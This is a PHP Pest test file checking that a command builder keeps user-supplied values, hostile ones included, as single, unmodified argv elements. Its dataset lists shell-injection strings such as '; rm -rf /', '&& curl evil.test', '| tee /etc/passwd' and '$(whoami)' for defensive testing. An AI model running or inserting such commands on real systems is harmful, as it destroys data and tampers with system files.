<?php

declare(strict_types=1);

use Bityukov\CommandCenter\Definitions\Command;
use Bityukov\CommandCenter\Definitions\Variables\TextVariable;
use Bityukov\CommandCenter\Execution\ArgvBuilder;

dataset('hostile values', [
    'command chaining' => '; rm -rf /',
    'ampersand chaining' => '&& curl evil.test',
    'pipe' => '| tee /etc/passwd',
    'command substitution' => '$(whoami)',
    'backtick substitution' => '`id`',
    'variable expansion' => '$HOME',
    'newline injection' => "safe\nrm -rf /",
    'null byte' => "safe\0evil",
    'argument terminator' => '--',
    'leading dash' => '--force',
    'redirect' => '> /etc/hosts',
    'glob' => '*',
    'quote soup' => '\'"$(id)"\'',
    'unicode' => 'файл имя',
    'spaces' => 'my documents/backup file',
]);

it('keeps a hostile standalone value as exactly one argv element', function (string $hostile): void {
    $definition = Command::make('x')
        ->run('backup:run {path}')
        ->variables([TextVariable::make('path')])
        ->toDefinition(defaultTimeout: 60);

    $argv = (new ArgvBuilder)->build($definition, ['path' => $hostile]);

    expect($argv)->toHaveCount(2)
        ->and($argv[0])->toBe('backup:run')
        ->and($argv[1])->toBe($hostile);
})->with('hostile values');

it('keeps a hostile embedded value inside one argv element', function (string $hostile): void {
    $definition = Command::make('x')
        ->run('backup:run --path={path}')
        ->variables([TextVariable::make('path')])
        ->toDefinition(defaultTimeout: 60);

    $argv = (new ArgvBuilder)->build($definition, ['path' => $hostile]);

    expect($argv)->toHaveCount(2)
        ->and($argv[1])->toBe('--path='.$hostile);
})->with('hostile values');

it('never escapes or mutates the submitted value', function (string $hostile): void {
    $definition = Command::make('x')
        ->run('cmd {v}')
        ->variables([TextVariable::make('v')])
        ->toDefinition(defaultTimeout: 60);

    $argv = (new ArgvBuilder)->build($definition, ['v' => $hostile]);

    expect($argv[1])->toBe($hostile)
        ->and($argv[1])->not->toContain('\\\\');
})->with('hostile values');

it('does not let a value inject an additional argv element', function (): void {
    $definition = Command::make('x')
        ->run('cmd {v}')
        ->variables([TextVariable::make('v')])
        ->toDefinition(defaultTimeout: 60);

    $argv = (new ArgvBuilder)->build($definition, ['v' => 'one two three']);

    expect($argv)->toBe(['cmd', 'one two three']);
});

it('does not let a value introduce a new token', function (): void {
    $definition = Command::make('x')
        ->run('cmd {v}')
        ->variables([TextVariable::make('v')])
        ->toDefinition(defaultTimeout: 60);

    $argv = (new ArgvBuilder)->build($definition, ['v' => '{other}']);

    expect($argv)->toBe(['cmd', '{other}']);
});
